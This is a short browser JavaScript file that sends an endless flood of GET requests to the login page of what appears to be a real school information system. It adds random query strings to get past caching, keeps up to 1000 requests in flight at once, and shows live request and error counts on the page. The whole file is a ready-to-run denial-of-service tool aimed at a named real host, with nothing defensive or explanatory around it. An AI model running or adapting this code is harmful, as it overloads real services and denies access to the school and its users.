// let URL = "https://lepikjs.netlify.app/"
let URL = "https://gsosfm.bakalari.cz/Login"
let LIMIT = 1000



let errorAmount = 0;
let requestAmount = 0;
let queue = []

let canDo = false



async function timeoutFetch(tokenizedURL) {
  const abortController = new AbortController();
  const intId = setTimeout(() => abortController.abort(), 1000);
  return fetch(tokenizedURL, {
    method: 'GET',
    mode: 'no-cors',
    signal: abortController.signal
  }).then((response) => {
    clearTimeout(intId);
    return response;
  }).catch((error) => {
    clearTimeout(intId);
    throw error;
  });
}

async function start() {
  for (let i = 0; ; ++i) {
    console.log("here")
    if (queue.length > LIMIT) {
      await queue.shift()
    }
    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
    queue.push(
      timeoutFetch(URL + rand)
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          errorAmount++;
        })
        .then((response) => {
          if (response && !response.ok) {
            errorAmount++;
          }
          requestAmount++;
        })

    )
  }
}

window.onload = () => {
  setInterval(() => {
    console.log(`${requestAmount} requests, ${errorAmount} errors`)
    document.querySelector("body").innerHTML = `<h1>Requests: </h1> ${requestAmount} <br> <h1>Errors: </h1> ${errorAmount}`
  }, 1000);

  start()
}

